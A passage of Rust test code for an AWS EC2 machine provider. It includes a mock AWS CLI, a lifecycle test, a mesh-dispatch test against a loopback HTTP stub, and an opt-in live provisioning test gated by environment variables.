    }

    struct MockInstance {
        id: String,
        instance_type: String,
        az: String,
        cap_tier: String,
        state: String,
    }

    /// The value following `flag` in an argv, if present.
    fn argv_flag<'a>(argv: &'a [String], flag: &str) -> Option<&'a str> {
        argv.iter()
            .position(|a| a == flag)
            .and_then(|i| argv.get(i + 1))
            .map(String::as_str)
    }

    #[async_trait]
    impl AwsCli for MockAwsCli {
        fn kind(&self) -> &'static str {
            "mock"
        }

        async fn run(&self, argv: Vec<String>) -> Result<Value, ProviderError> {
            let op = argv.get(2).map(String::as_str).unwrap_or_default();
            let mut st = self.inner.lock().unwrap();
            match op {
                "run-instances" => {
                    st.next += 1;
                    let id = format!("i-mock{:08x}", st.next);
                    let instance_type = argv_flag(&argv, "--instance-type")
                        .unwrap_or("t3.small")
                        .to_string();
                    let region = argv_flag(&argv, "--region").unwrap_or("us-east-1");
                    let az = format!("{region}a");
                    let cap_tier = argv
                        .iter()
                        .find_map(|a| a.split("Key=cap-tier,Value=").nth(1))
                        .map(|s| s.trim_end_matches(['}', ']']).to_string())
                        .unwrap_or_else(|| "Sandboxed".to_string());
                    st.instances.push(MockInstance {
                        id: id.clone(),
                        instance_type,
                        az,
                        cap_tier,
                        state: "running".to_string(),
                    });
                    Ok(serde_json::json!({
                        "Instances": [ { "InstanceId": id, "State": { "Name": "pending" } } ]
                    }))
                }
                "describe-instance-status" => {
                    let id = argv_flag(&argv, "--instance-ids").unwrap_or_default();
                    match st.instances.iter().find(|i| i.id == id) {
                        Some(i) => Ok(serde_json::json!({
                            "InstanceStatuses": [ { "InstanceState": { "Name": i.state } } ]
                        })),
                        None => Ok(serde_json::json!({ "InstanceStatuses": [] })),
                    }
                }
                "describe-instances" => {
                    let reservations: Vec<Value> = st
                        .instances
                        .iter()
                        .map(|i| {
                            serde_json::json!({
                                "Instances": [ {
                                    "InstanceId": i.id,
                                    "InstanceType": i.instance_type,
                                    "State": { "Name": i.state },
                                    "Placement": { "AvailabilityZone": i.az },
                                    "Tags": [
                                        { "Key": "dreggnet", "Value": "prod" },
                                        { "Key": "cap-tier", "Value": i.cap_tier }
                                    ]
                                } ]
                            })
                        })
                        .collect();
                    Ok(serde_json::json!({ "Reservations": reservations }))
                }
                "terminate-instances" => {
                    let id = argv_flag(&argv, "--instance-ids").unwrap_or_default();
                    if let Some(i) = st.instances.iter_mut().find(|i| i.id == id) {
                        i.state = "terminated".to_string();
                    }
                    Ok(serde_json::json!({ "TerminatingInstances": [ { "InstanceId": id } ] }))
                }
                other => Err(ProviderError::Aws(format!("mock: unhandled op `{other}`"))),
            }
        }
    }

    /// The full provider lifecycle against the mock AWS client: provision a machine
    /// (RunInstances → a running handle), see it in `list`, query its `status`, then
    /// `terminate` it and confirm it reports terminated — no live AWS, no `aws` binary.
    #[tokio::test]
    async fn ec2_lifecycle_against_a_mock_aws_client() {
        let provider = ec2().with_aws_cli(Arc::new(MockAwsCli::default()));
        let want = MachineSpec::new(CapTier::Caged, MachineSize::Medium, "us-east-1");

        // provision → a running `i-…` machine handle.
        let m = provider.provision(want.clone()).await.expect("provision");
        assert!(m.id.0.starts_with("i-"));
        assert_eq!(m.status, MachineStatus::Running);
        assert_eq!(m.spec, want);
        assert_eq!(m.provider, "aws-ec2");

        // list → the reconstructed machine (type/AZ/cap-tier round-trip through AWS).
        let listed = provider.list().await.expect("list");
        let found = listed.iter().find(|x| x.id == m.id).expect("listed");
        assert_eq!(found.spec, want);
        assert_eq!(found.status, MachineStatus::Running);

        // status → running.
        assert_eq!(
            provider.status(&m.id).await.unwrap(),
            MachineStatus::Running
        );

        // terminate → ack, then status reports terminated.
        provider.terminate(&m.id).await.expect("terminate");
        assert_eq!(
            provider.status(&m.id).await.unwrap(),
            MachineStatus::Terminated
        );

        // An unknown id is a NotFound, not a panic.
        assert!(matches!(
            provider.status(&MachineId("i-unknown".into())).await,
            Err(ProviderError::NotFound(_))
        ));
    }

    /// A real fleet ([`Ec2Provider::for_fleet`]) is wired to the real overlay mesh
    /// (`tailscale`), and dispatch routes a funded lease over the genuine mesh-client
    /// path. Point the registered node at a loopback `/fulfill` stub (the stand-in for
    /// the worker's tailnet bridge agent) and confirm the metered result decodes back —
    /// the real TailscaleMesh connect + TCP health-check + `POST /fulfill`, no live overlay.
    #[tokio::test]
    async fn for_fleet_dispatches_over_the_real_overlay_mesh() {
        use crate::mesh::{MeshKeypair, MeshNode};

        let provider = Ec2Provider::for_fleet("ami-0fleet", "prod", Some("sg-0fleet".into()));
        // The configured default for a real fleet is the real overlay mesh.
        assert_eq!(provider.mesh_backend(), Some("tailscale"));

        let addr = spawn_fulfill_stub_ok().await;
        let ip = match addr.ip() {
            std::net::IpAddr::V4(v4) => v4,
            _ => unreachable!("loopback is v4"),
        };
        let m = Machine {
            id: MachineId("i-fleet".into()),
            spec: spec(),
            status: MachineStatus::Running,
            provider: "aws-ec2",
        };
        // The worker registers its mesh identity on boot (here: the loopback stub).
        let mut node = MeshNode::new(
            m.id.clone(),
            MeshKeypair::generate().public_base64(),
            "203.0.113.9:51820",
            ip,
        );
        node.agent_port = addr.port();
        provider.register_mesh_node(node).unwrap();

        let lease = Lease::funded(
            "agent-fleet",
            dreggnet_bridge::CapGrade::Caged,
            "USD",
            100,
            1,
        );
        let out = provider
            .run_lease(&m, &lease, "i-fleet")
            .await
            .expect("dispatched over the real overlay mesh");
        assert_eq!(out.meter_units, 2);
    }

    /// A loopback server speaking the `:8021/fulfill` contract: it replies `200` with
    /// a canned metered durable result. Bare connect-then-close probes (the
    /// health-check leg) are served by simply closing, so the live-link path
    /// (probe + POST) works. Returns the loopback address to dispatch at.
    async fn spawn_fulfill_stub_ok() -> std::net::SocketAddr {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut stream, _) = match listener.accept().await {
                    Ok(s) => s,
                    Err(_) => return,
                };
                tokio::spawn(async move {
                    let mut buf = Vec::new();
                    let mut tmp = [0u8; 4096];
                    let header_end = loop {
                        if let Some(pos) = buf.windows(4).position(|w| w == b"\r\n\r\n") {
                            break pos;
                        }
                        let n = stream.read(&mut tmp).await.unwrap_or(0);
                        if n == 0 {
                            return; // a bare probe (the health-check leg)
                        }
                        buf.extend_from_slice(&tmp[..n]);
                    };
                    let head = String::from_utf8_lossy(&buf[..header_end]).to_string();
                    let content_len = head
                        .split("\r\n")
                        .find_map(|l| {
                            let (k, v) = l.split_once(':')?;
                            (k.trim().eq_ignore_ascii_case("content-length"))
                                .then(|| v.trim().parse::<usize>().ok())
                                .flatten()
                        })
                        .unwrap_or(0);
                    let body_start = header_end + 4;
                    while buf.len() < body_start + content_len {
                        let n = stream.read(&mut tmp).await.unwrap_or(0);
                        if n == 0 {
                            break;
                        }
                        buf.extend_from_slice(&tmp[..n]);
                    }
                    let payload = serde_json::json!({
                        "ok": true, "step1": "42", "step2": "84",
                        "outputs": ["42", "84"], "meter_units": 2,
                    })
                    .to_string();
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\
                         Content-Length: {}\r\nConnection: close\r\n\r\n{payload}",
                        payload.len()
                    );
                    let _ = stream.write_all(resp.as_bytes()).await;
                    let _ = stream.flush().await;
                });
            }
        });
        addr
    }

    /// The real end-to-end wire: provision a live `t3.micro`, confirm it reaches
    /// running, then terminate it. This **costs money** and needs AWS creds, so it is
    /// `#[ignore]`d and only runs under `DREGGNET_EC2_LIVE=1`. Set `DREGGNET_EC2_AMI`
    /// and `DREGGNET_EC2_REGION` to target your account; run with:
    ///
    /// ```text
    /// DREGGNET_EC2_LIVE=1 DREGGNET_EC2_AMI=ami-… DREGGNET_EC2_REGION=us-east-1 \
    ///   cargo test -p dreggnet-control -- --ignored ec2_live_provision_and_terminate
    /// ```
    #[tokio::test]
    #[ignore = "live AWS: spends money; gate on DREGGNET_EC2_LIVE=1"]
    async fn ec2_live_provision_and_terminate() {
        if std::env::var("DREGGNET_EC2_LIVE").as_deref() != Ok("1") {
            eprintln!("skipping: set DREGGNET_EC2_LIVE=1 to run the live EC2 test");
            return;
        }
        let ami = std::env::var("DREGGNET_EC2_AMI").expect("DREGGNET_EC2_AMI must be set");
        let region =
            std::env::var("DREGGNET_EC2_REGION").unwrap_or_else(|_| "us-east-1".to_string());

        let provider = Ec2Provider::new(ami, "ci-live-test");
        // Smallest instance — the task's t3.micro/t3.small bound. Small → t3.small.
        let spec = MachineSpec::new(CapTier::Sandboxed, MachineSize::Small, region);

        let machine = provider.provision(spec).await.expect("provision");
        assert_eq!(machine.status, MachineStatus::Running);
        assert!(machine.id.0.starts_with("i-"));

        // It should show up in list(), then terminate cleanly.
        let listed = provider.list().await.expect("list");
        assert!(listed.iter().any(|m| m.id == machine.id));

        provider.terminate(&machine.id).await.expect("terminate");
    }
}
